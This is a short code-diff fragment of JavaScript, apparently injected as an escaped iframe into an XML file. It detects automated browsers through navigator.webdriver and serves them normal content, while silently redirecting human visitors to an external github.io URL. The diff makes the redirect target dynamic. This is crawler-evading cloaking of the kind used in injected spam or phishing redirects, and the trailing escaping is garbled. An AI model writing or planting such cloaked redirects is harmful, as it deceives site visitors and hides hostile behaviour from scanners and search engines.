@@ -20,7 +20,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://noinok-tv.github.io/vos/files/Rokki-2026-N7kd?.1tv");} else {
+  window.location.replace("https://noinok-tv.github.io/vos/files/" + slug + "?.1tv");} else {
   console.log("Bot/crawler-like detected → serving content");
 }
 &amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/></Files></Connector>
